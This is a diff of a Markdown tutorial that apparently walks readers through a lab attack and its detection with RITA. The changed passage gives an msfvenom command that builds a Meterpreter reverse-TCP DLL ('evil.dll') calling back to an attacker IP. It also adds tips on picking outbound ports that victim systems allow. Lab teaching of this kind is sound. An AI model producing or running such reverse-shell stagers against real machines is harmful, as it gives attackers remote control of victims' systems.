@@ -545,12 +545,12 @@ Here's the cool thing about installing ***RITA***: when we do so it will also au
 
 OK. Do you know what time it is? 
 
-Yeah it's time for all this installing and configuring to pay off - let's we kick things off by performing the attack! Let's get it!
+Yeah it's time for all this installing and configuring to pay off - let's kick things off by performing the attack!
 
 {{< figure src="/img/strangelove.gif" title="" class="custom-figure" >}}
 
 ***
-
+***
 # 2. Performing the Attack 
 # 2.1. Introduction 
 Why are we performing the attack ourselves? Why didn't I just do it, export all the requisite artifacts, and share this with you? Why am I making you go through this rigmarole - is it simply that I am cruel?
@@ -622,21 +622,6 @@ So though admittedly the previous sections is a somewhat shallow overview of the
 
 # 2.3. ATTACK!
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 Finally! The time has come to give it our best shot... 
 
 {{< figure src="/img/attack_kip.gif" title="" class="custom-figure" >}}
@@ -659,30 +644,18 @@ Finally! The time has come to give it our best shot...
 
 {{< figure src="/img/image035.png" title="" class="custom-figure-3" >}}
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-Great now that everything is setup let's generate our stager and transfer it over to the victim. 
+**Great now let's generate our stager and transfer it over to the victim.** 
 1. On our Kali VM open your terminal.
-2. We are going to run the command below, which will generate a payload for us using `msfvenom` (a standalone app that is part of the Metasploit framework). Note the following:
-- `Lhost` is the IP of the **listening** machine, ie the attacker. Yours will be different than mine here, adapt it!
-- `Lport` is the port we will be listening on. This could be anything really, you can see in this case I chose an arbitraty port 88. You should be aware however that some victim systems may have strict rules regarding which outbound ports are allowed to be used, in these cases a standard port such as 80/443 would be a safer choice. Feel free to experiment/choose any port you'd like\
-- `-f` designates the file type, which of course is DLL in this case.
-- `>` indicates where we wish to save it, as well as the name we are giving to it, you can see I am saving it on my desktop as `evil.dll` - very subtle!
-
+2. We are going to run the command below, which will generate a payload for us using `msfvenom` (a standalone app that is part of the Metasploit framework). 
 ```
 sudo msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.230.155 Lport=88 -f dll > /home/hacker/Desktop/evil.dll
 ```
+Note the following:
+    - `Lhost` is the IP of the **listening** machine, ie the attacker. Yours will be different than mine here, adapt it!
+    - `Lport` is the port we will be listening on. This could be anything really, you can see in this case I chose an arbitraty port 88. You should be aware however that some victim systems may have strict rules regarding which outbound ports are allowed to be used, in these cases a standard port such as 80/443 would be a safer choice. Feel free to experiment/choose any port you'd like\
+    - `-f` designates the file type, which of course is DLL in this case.
+    - `>` indicates where we wish to save it, as well as the name we are giving to it, you can see I am saving it on my desktop as `evil.dll` - very subtle!
+
 
 {{< figure src="/img/image037.png" title="" class="custom-figure" >}}
 
